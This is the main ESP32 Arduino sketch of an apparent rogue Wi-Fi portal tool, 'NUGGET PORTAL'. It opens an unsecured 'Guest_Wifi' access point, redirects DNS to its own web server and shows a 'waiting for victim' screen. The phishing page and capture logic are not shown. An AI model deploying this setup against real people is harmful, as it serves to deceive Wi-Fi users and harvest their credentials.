#include <AsyncTCP.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <esp_wifi.h>
#include "FS.h"
#include <LittleFS.h>
#include <HTTPClient.h>
#include "html_code.h"
#include "wifi_access.h"
#include "Screen.h"
#include "web_server.h"

#include "Vars.h"
#include "Buttons.h"

const char *ssid = "Guest_Wifi";
const char *password = NULL;

const IPAddress localIP(4, 3, 2, 1);
const IPAddress gatewayIP(4, 3, 2, 1);  
const IPAddress subnetMask(255, 255, 255, 0);

DNSServer dnsServer;
AsyncWebServer server(80);

void setup() {
  Serial.setRxBufferSize(1024);
  Serial.begin(115200);

  // Wait for the Serial object to become available.
  while (!Serial)
    ;

  Buttons::setupButtons();

  Screen::initDisplay();
  Screen::displaySplash(3);
  Screen::displayWaitingForVictim();

  // Print a welcome message to the Serial port.
  Serial.println("\n\nNUGGET PORTAL, V1.0 compiled " __DATE__ " " __TIME__ " by Ryan");
  Serial.printf("%s-%d\n\r", ESP.getChipModel(), ESP.getChipRevision());

  startSoftAccessPoint(ssid, password, localIP, gatewayIP);
  WebServer::setUpDNSServer(dnsServer, localIP);
  WebServer::setUpWebserver(server, localIP);

  if (!LittleFS.begin(FORMAT_LITTLEFS_IF_FAILED)) {
    Serial.println("LittleFs Mount Failed");
    return;
  }
 
  server.begin();

  Serial.print("\n");
  Serial.print("Startup Time:");
  Serial.println(millis());
  Serial.print("\n");
}

void loop() {
  dnsServer.processNextRequest();

  Buttons::updateButtons();

  delay(DNS_INTERVAL);
}
